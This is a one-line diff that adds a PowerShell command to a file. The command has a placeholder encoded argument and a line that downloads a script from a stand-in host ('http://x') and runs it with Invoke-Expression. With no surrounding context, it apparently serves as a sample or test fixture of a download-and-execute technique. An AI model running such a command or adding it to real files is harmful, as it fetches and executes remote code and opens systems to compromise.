@@ -1,0 +1,1 @@
+powershell -enc AAAA; Invoke-Expression ((New-Object Net.WebClient).DownloadString('http://x'))
